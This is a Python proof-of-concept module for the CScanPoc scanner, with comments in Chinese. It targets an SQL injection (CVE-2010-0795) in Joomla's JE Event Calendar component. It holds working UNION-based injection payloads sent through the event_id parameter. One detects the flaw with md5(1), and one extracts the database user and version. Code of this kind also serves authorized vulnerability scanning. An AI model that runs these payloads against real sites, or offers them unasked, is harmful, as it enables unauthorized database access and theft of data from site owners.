# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'Joomla_0047'  # 平台漏洞编号
    name = 'Joomla Component JE Event Calendar SQL Injection Vulnerability'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2010-03-02'  # 漏洞公布时间
    desc = '''
        Joomla!的组件JE Event Calendars (com_jeeventcalendar)存在SQL注入漏洞。
        远程攻击者可以借助脚本index.php中的事件操作的event_id参数，执行任意的SQL命令。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2010-5058'
    cnvd_id = 'CNVD-2010-5058'  # cnvd漏洞编号
    cve_id = 'CVE-2010-0795'  # cve编号
    product = 'Joomla!'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ef79be26-fd26-4848-8b45-340c378429a9'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            # 访问的地址
            exploit = '/index.php?option=com_jeeventcalendar&view=event&Itemid=155&event_id='
            # 利用Union方式（计算md5(1)）
            payload = "-1%22+UNION+ALL+SELECT+1,md5(1),3,4,5,6,7,8,9,10,11%23"
            # 构造漏洞利用连接
            vulurl = arg+exploit+payload
            # 自定义的HTTP头
            httphead = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Connection': 'keep-alive'
            }
            # 发送请求
            resp = requests.get(url=vulurl, headers=httphead, timeout=50)
            # 检查是否含有特征字符串(md5(1)=c4ca4238a0b923820dcc509a6f75849b)
            if 'c4ca4238a0b923820dcc509a6f75849b' in resp.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            # 访问的地址
            exploit = '/index.php?option=com_jeeventcalendar&view=event&Itemid=155&event_id='
            # 利用Union方式读取数据库信息
            payload = "-1%22+UNION+ALL+SELECT+1,concat(0x247e7e7e24,user(),0x2a2a2a,version(),0x247e7e7e24),3,4,5,6,7,8,9,10,11%23"
            # 构造漏洞利用连接
            vulurl = arg+exploit+payload
            # 自定义的HTTP头
            httphead = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Connection': 'keep-alive'
            }
            # 提取信息的正则表达式
            parttern = '\$~~~\$(.*)\*\*\*(.*)\$~~~\$'
            # 发送请求
            resp = requests.get(url=vulurl, headers=httphead, timeout=50)
            # 检查返回结果
            if resp.status_code == 200:
                # 提取信息
                match = re.search(parttern, resp.text, re.M | re.I)
                if match:
                    dbusername = match.group(1)
                    dbversion = match.group(2)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到的数据库用户为{dbusername} 数据库版本为{dbversion}'.format(
                        target=self.target, name=self.vuln.name, dbusername=dbusername, dbversion=dbversion))
        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
